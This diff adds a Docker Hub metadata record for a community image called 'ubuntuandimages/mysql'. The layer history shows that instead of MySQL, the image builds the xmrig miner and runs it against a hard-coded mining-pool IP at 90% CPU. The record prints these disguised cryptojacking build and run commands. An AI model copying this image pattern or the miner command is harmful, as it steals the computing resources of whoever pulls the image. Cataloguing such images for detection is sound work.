@@ -1,0 +1,173 @@
+{
+    "id": "",
+    "name": "ubuntuandimages/mysql",
+    "slug": "ubuntuandimages/mysql",
+    "type": "image",
+    "publisher": {
+      "id": "77b08b71d7184334b5f95a333bbc0ff3",
+      "name": "ubuntuandimages"
+    },
+    "created_at": "2018-10-20T01:01:03.417514",
+    "updated_at": "2018-10-20T01:01:26.894238",
+    "short_description": "",
+    "full_description": "",
+    "source": "community",
+    "popularity": 0,
+    "categories": null,
+    "operating_systems": [
+      {
+        "label": "Linux",
+        "name": "linux"
+      }
+    ],
+    "architectures": [
+      {
+        "label": "x86-64",
+        "name": "amd64"
+      }
+    ],
+    "links": null,
+    "screenshots": null,
+    "logo_url": {
+      "large": "",
+      "small": ""
+    },
+    "is_offline": false,
+    "plan": null,
+    "certification_status": "not_certified",
+    "start_count": 0,
+    "filter_type": "community",
+    "pull_count": "1.8K",
+    "moreinfo": {
+      "user": "ubuntuandimages",
+      "name": "mysql",
+      "namespace": "ubuntuandimages",
+      "repository_type": "image",
+      "status": 1,
+      "description": "",
+      "is_private": false,
+      "is_automated": false,
+      "can_edit": false,
+      "star_count": 1,
+      "pull_count": 1819,
+      "last_updated": "2018-10-20T01:01:26.894238",
+      "is_migrated": false,
+      "has_starred": false,
+      "full_description": "",
+      "affiliation": "",
+      "permissions": {
+        "admin": false,
+        "read": true,
+        "write": false
+      }
+    },
+    "tag": {
+      "name": "latest",
+      "full_size": 186430778,
+      "images": [
+        {
+          "architecture": "amd64",
+          "digest": "sha256:a80e7a79b49b3a0957009e5260bb2d56d48347433d448bc51266b7534d9cf392",
+          "features": "",
+          "os": "linux",
+          "os_features": "",
+          "os_version": null,
+          "size": 186430778,
+          "variant": null
+        }
+      ],
+      "id": 37952159,
+      "repository": 6173744,
+      "creator": 4368872,
+      "last_updater": 4368872,
+      "last_updater_username": "ubuntuandimages",
+      "image_id": null,
+      "v2": true,
+      "last_updated": "2018-10-20T01:01:23.335582",
+      "history": [
+        {
+          "size": 186430778,
+          "digest": "sha256:a80e7a79b49b3a0957009e5260bb2d56d48347433d448bc51266b7534d9cf392",
+          "architecture": "amd64",
+          "os": "linux",
+          "os_version": null,
+          "os_features": null,
+          "variant": null,
+          "features": null,
+          "layers": [
+            {
+              "digest": "sha256:18d680d616571900d78ee1c8fff0310f2a2afe39c6ed0ba2651ff667af406c3e",
+              "size": 43352848,
+              "instruction": "ADD file:01a5c4f2b1dcc8f8aebe00ce8ed6ceda7038abc31d40caf69273240cdd453b84 in / "
+            },
+            {
+              "digest": "sha256:0addb6fece630456e0ab187b0aa4304d0851ba60576e7f6f9042a97ee908a796",
+              "size": 851,
+              "instruction": "/bin/sh -c set -xe \t\t&& echo '#!/bin/sh' > /usr/sbin/policy-rc.d \t&& echo 'exit 101' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i 's/^exit.*/exit 0/' /sbin/initctl \t\t&& echo 'force-unsafe-io' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo 'DPkg::Post-Invoke { \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; };' > /etc/apt/apt.conf.d/docker-clean \t&& echo 'APT::Update::Post-Invoke { \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; };' >> /etc/apt/apt.conf.d/docker-clean \t&& echo 'Dir::Cache::pkgcache \"\"; Dir::Cache::srcpkgcache \"\";' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo 'Acquire::Languages \"none\";' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo 'Acquire::GzipIndexes \"true\"; Acquire::CompressionTypes::Order:: \"gz\";' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo 'Apt::AutoRemove::SuggestsImportant \"false\";' > /etc/apt/apt.conf.d/docker-autoremove-suggests"
+            },
+            {
+              "digest": "sha256:78e58219b215b359fe002f0ca1f416617b75ca9b36cb274c98d7a5f808711179",
+              "size": 620,
+              "instruction": "/bin/sh -c rm -rf /var/lib/apt/lists/*"
+            },
+            {
+              "digest": "sha256:eb6959a66df2ea26a26452ba11f84fb64bb45af90204374862ec71ee59f795e7",
+              "size": 169,
+              "instruction": "/bin/sh -c mkdir -p /run/systemd && echo 'docker' > /run/systemd/container"
+            },
+            {
+              "size": 0,
+              "instruction": " CMD [\"/bin/bash\"]"
+            },
+            {
+              "digest": "sha256:41cb6a31c04305a9349494233a5e0815485a4383b7aa4ce5e8afdaabc9b1f68f",
+              "size": 92,
+              "instruction": "WORKDIR /app"
+            },
+            {
+              "size": 0,
+              "instruction": " USER root"
+            },
+            {
+              "digest": "sha256:0a9b9dce8c9ca43e2c9aacba8246e9f3c1dda62f7eb2201fa10d3d0a99d0a525",
+              "size": 18098291,
+              "instruction": "/bin/sh -c apt-get update"
+            },
+            {
+              "digest": "sha256:4d003608254ba6a2659e2d5d5a07ec91cb73aba157d7dac7ad7d3ac31e568695",
+              "size": 121677019,
+              "instruction": "/bin/sh -c apt-get install git -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev"
+            },
+            {
+              "digest": "sha256:eea8dda920282b665aa6ffa30573246c5e33552fd17a7af561798a1251f8ddeb",
+              "size": 2184953,
+              "instruction": "/bin/sh -c git clone https://github.com/xmrig/xmrig.git"
+            },
+            {
+              "size": 0,
+              "instruction": "WORKDIR /app/xmrig"
+            },
+            {
+              "digest": "sha256:a1d783611e2055b18185cd9ad103a9f91a1c7a183071a8ab5ee98a38baaa16c5",
+              "size": 136,
+              "instruction": "WORKDIR /app/xmrig/build"
+            },
+            {
+              "digest": "sha256:a379e2d58c9bac3d9c35e32e81e74796a3e8fcf9d39856ba44aa429c58e23f49",
+              "size": 45281,
+              "instruction": "/bin/sh -c cmake .."
+            },
+            {
+              "digest": "sha256:3af9bc273f4f5a49fa111450aa539448235dea0af7cf12c8bc2ccfac97243993",
+              "size": 1070518,
+              "instruction": "/bin/sh -c make"
+            },
+            {
+              "size": 0,
+              "instruction": " CMD [\"/bin/sh\" \"-c\" \"./xmrig -o stratum+tcp://217.78.0.224:1231 --max-cpu-usage=90 --donate-level=1 -u bla -p v8\"]"
+            }
+          ]
+        }
+      ]
+    }
+}
